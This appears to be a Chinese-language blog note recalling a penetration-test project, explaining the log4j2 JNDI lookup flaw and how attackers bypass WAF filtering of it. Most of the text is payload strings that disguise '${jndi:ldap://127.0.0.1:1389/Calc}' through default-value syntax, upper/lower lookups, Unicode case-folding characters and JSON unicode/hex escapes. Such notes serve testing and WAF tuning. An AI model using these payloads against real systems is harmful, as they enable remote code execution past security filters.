
##  0x00 原理介绍
     
         去年有个项目，有WAF，然后进行了绕过，成功反弹，现在在回忆记录一下。
     
     log4j2输出日志的时候除了常见的变量替换，还支持远程获取相应的内容，获取远程内容是通过lookup功能提供，
     
     ## 变量替换如下
     
     logger.info("user name: {}, alias name: {}", userName, aliasName)
     
     获取远程内容支持jndi
     
## WAF绕过总结

         从log4j-2.15.0-rc2开始，默认关闭了Lookups功能，需要修改配置才能结合各种绕过方式，所以意义不大，2.16.0开始，移除了Lookups功能，然后在受影响版本log4j2.0-beta9 <= 版本 log4j <= 2.14.1中，由于waf多拦截jndi等关键字，可通过如下几种方式进行绕过。
         
         :- 是一个赋值关键字，如果程序处理到 ${aaaa:-bbbb} 这样的字符串，处理的结果将会是 bbbb，借助此特性，可构造如下waf绕过
logg.info("${${::-J}ndi:ldap://127.0.0.1:1389/Calc}");


Lookups中除了jndi还存在Upper、Lower等方式，可变换大小写，可构造如下waf绕过
logg.info("${${lower:J}ndi:ldap://127.0.0.1:1389/Calc}");
logg.info("${${upper:j}ndi:ldap://127.0.0.1:1389/Calc}");


同时也可以利用一些特殊字符的大小写转化的问题
ı => upper => i (Java 中测试可行)
ſ => upper => S (Java 中测试可行)
İ => upper => i (Java 中测试不可行)
K => upper => k (Java 中测试不可行)
logg.error("${jnd${upper:ı}:ldap://127.0.0.1:1389/Calc}");


现在数据传输很多都是 json 形式，所以在 json 中我们也可以进行尝试
像 Jackson 和 fastjson 又有 unicode 和 hex 的编码特性，所以就可以尝试编码绕过
{"key":"\u0024\u007b"}
{"key":"\x24\u007b"}
